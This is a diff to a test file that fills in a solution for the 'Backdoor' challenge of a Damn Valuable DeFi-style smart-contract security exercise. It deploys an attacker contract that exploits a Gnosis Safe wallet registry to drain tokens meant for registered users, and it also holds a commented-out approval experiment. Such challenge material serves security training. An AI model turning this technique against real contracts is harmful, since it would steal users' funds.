@@ -15,7 +15,7 @@ describe('[Challenge] Backdoor', function () {
         this.masterCopy = await (await ethers.getContractFactory('GnosisSafe', deployer)).deploy();
         this.walletFactory = await (await ethers.getContractFactory('GnosisSafeProxyFactory', deployer)).deploy();
         this.token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
-        
+
         // Deploy the registry
         this.walletRegistry = await (await ethers.getContractFactory('WalletRegistry', deployer)).deploy(
             this.masterCopy.address,
@@ -28,7 +28,7 @@ describe('[Challenge] Backdoor', function () {
         for (let i = 0; i < users.length; i++) {
             expect(
                 await this.walletRegistry.beneficiaries(users[i])
-            ).to.be.true;            
+            ).to.be.true;
         }
 
         // Transfer tokens to be distributed to the registry
@@ -37,13 +37,34 @@ describe('[Challenge] Backdoor', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        // Experiment: approval under certain balance is possible
+        /*
+        // attacker did not have any DamnValuableTokens but made an approval
+        await this.token.connect(attacker).approve(deployer.address,
+            ethers.utils.parseEther('20'));
+        // then, attacker get some DVT
+        await this.token.transfer(attacker.address, ethers.utils.parseEther('30'));
+        // the success of transferFrom() proves that previous approval works.
+        await this.token.connect(deployer).transferFrom(
+            attacker.address, deployer.address, ethers.utils.parseEther('20')
+        );*/
+        const backdoorFactory = await ethers.getContractFactory('Backdoor',
+            attacker);
+        backdoor = await backdoorFactory.deploy(
+            this.token.address,
+            this.masterCopy.address,
+            this.walletFactory.address,
+            this.walletRegistry.address
+        );
+        await backdoor.connect(attacker).attack(users,
+                                                users.length);
     });
 
     after(async function () {
         /** SUCCESS CONDITIONS */
         for (let i = 0; i < users.length; i++) {
             let wallet = await this.walletRegistry.wallets(users[i]);
-            
+
             // User must have registered a wallet
             expect(wallet).to.not.eq(ethers.constants.AddressZero, "User did not register a wallet");
 
